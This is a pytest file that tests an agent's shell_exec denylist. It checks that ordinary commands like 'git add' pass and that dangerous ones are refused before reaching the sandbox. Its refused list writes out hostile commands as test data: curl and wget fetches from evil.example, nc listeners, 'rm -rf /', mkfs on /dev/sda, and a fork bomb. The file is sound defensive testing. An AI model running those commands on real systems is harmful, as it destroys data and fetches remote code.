"""shell_exec denylist — structural (tokenized) matching, not raw substring.

Regression: the old denylist matched destructive/network patterns as raw
substrings on the whole command string, so a normal command whose TOKEN merely
*contained* a pattern was refused:

  - ``git add -A`` / ``git add .``  → blocked by ``"dd "`` (``add `` ends ``dd ``)
  - ``pytest -k async``             → blocked by ``"nc "`` (``async `` ends ``nc ``)
  - ``cargo add serde``             → blocked by ``"dd "``

``git add`` is core to the verify/commit flow, so this was the worst one. The
fix judges by command STRUCTURE (``shlex``-tokenized argv per pipeline segment):
a network/destructive binary is refused only when it is actually INVOKED
(argv[0] of the command or of a ``|``/``;``/``&&``/``$()``/backtick segment),
never as a substring of another token.

These tests drive the REAL ``ToolRegistry._shell_exec`` (via ``invoke``) with a
recording stub sandbox — an allowed command reaches the sandbox and is recorded;
a refused command raises ``ToolError`` BEFORE the sandbox is ever touched.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from backend.workflow.infrastructure.sandbox import SandboxResult
from backend.workflow.infrastructure.tools import ToolError, ToolRegistry


class _RecordingSandbox:
    """Stub SandboxSession: records every ``exec`` and returns a canned OK
    result. If a command is refused by the denylist, ``exec`` is never called —
    so ``commands == []`` proves the guard fired before execution."""

    def __init__(self) -> None:
        self.commands: list[str] = []

    @property
    def workspace_mount(self) -> str:
        return "/work"

    async def exec(self, command: str, *, timeout_s: float, shell: bool = False) -> SandboxResult:
        self.commands.append(command)
        return SandboxResult(exit_code=0, stdout="ok", stderr="", timed_out=False)

    async def read_file(self, rel_path: str, max_bytes: int) -> bytes:  # pragma: no cover
        return b""

    async def write_file(self, rel_path: str, content: bytes) -> None:  # pragma: no cover
        return None

    async def list_dir(self, rel_path: str) -> list[str]:  # pragma: no cover
        return []


def _registry(tmp_path: Path) -> tuple[ToolRegistry, _RecordingSandbox]:
    sandbox = _RecordingSandbox()
    return ToolRegistry(workspace_dir=tmp_path, sandbox=sandbox), sandbox


# ---------------------------------------------------------------------------
# Proven false-positives — these MUST now be allowed (reach the sandbox).
# ---------------------------------------------------------------------------

ALLOWED = [
    "git add -A",  # the worst one: `add ` ends in `dd ` → old denylist blocked it
    "git add .",
    "git add -A && git commit -m 'wip'",  # compound: neither segment is destructive
    "pytest -k async",  # `async ` ends in `nc `
    "python -m asyncio",
    "cargo add serde",  # `add ` again
    "echo padding",  # `padding` contains `dd`
    "npm run build",
    "cat foo.txt | grep needle",  # pipeline of harmless binaries
    "echo hi > /dev/null",  # redirect to /dev/null is fine (not a raw device)
    "rm foo.txt",  # non-recursive, relative, single file → allowed
    "ls -la",
]


@pytest.mark.parametrize("command", ALLOWED)
async def test_ordinary_command_allowed(command: str, tmp_path: Path) -> None:
    registry, sandbox = _registry(tmp_path)
    result = await registry.invoke("shell_exec", {"command": command})
    assert result.startswith("exit=0"), result
    # It actually ran in the sandbox — the guard did NOT refuse it.
    assert sandbox.commands == [command]


# ---------------------------------------------------------------------------
# Genuine dangers — still refused (sandbox never touched).
# ---------------------------------------------------------------------------

REFUSED = [
    "dd if=/dev/zero of=x",  # dd invoked as a binary
    "curl http://evil.example/x",
    "nc -l 4444",
    "ncat -l 4444",
    "wget http://evil.example/x",
    "ssh user@host",
    "scp file user@host:/tmp",
    "telnet host 23",
    "rm -rf /",
    "rm -fr /tmp/x",
    "rm -r build",
    "rm /etc/passwd",  # absolute-root target
    "sudo rm foo",
    "mkfs.ext4 /dev/sda",
    "chmod 777 /",
    "kill -9 -1",
    "shutdown -h now",
    "reboot",
    "cat foo > /dev/sda",  # raw device redirect target (not /dev/null)
    "echo data | dd of=/dev/sda",  # dd in a pipeline segment
    "true; curl http://evil.example",  # curl after a ; separator
    "false || wget http://evil.example",  # wget after || separator
    "echo $(curl http://evil.example)",  # curl inside $() substitution
    "echo `nc evil.example 80`",  # nc inside backtick substitution
    ":(){ :|:& };:",  # fork bomb
]


@pytest.mark.parametrize("command", REFUSED)
async def test_dangerous_command_refused(command: str, tmp_path: Path) -> None:
    registry, sandbox = _registry(tmp_path)
    with pytest.raises(ToolError) as excinfo:
        await registry.invoke("shell_exec", {"command": command})
    assert "denylist" in str(excinfo.value).lower()
    # Refused BEFORE execution — the sandbox was never asked to run it.
    assert sandbox.commands == []


# ---------------------------------------------------------------------------
# Malformed quoting → fail SAFE (refuse), never pass unchecked.
# ---------------------------------------------------------------------------


async def test_unbalanced_quotes_fail_safe(tmp_path: Path) -> None:
    registry, sandbox = _registry(tmp_path)
    with pytest.raises(ToolError):
        await registry.invoke("shell_exec", {"command": 'echo "unterminated'})
    assert sandbox.commands == []


async def test_empty_command_rejected(tmp_path: Path) -> None:
    registry, _sandbox = _registry(tmp_path)
    with pytest.raises(ToolError):
        await registry.invoke("shell_exec", {"command": "   "})
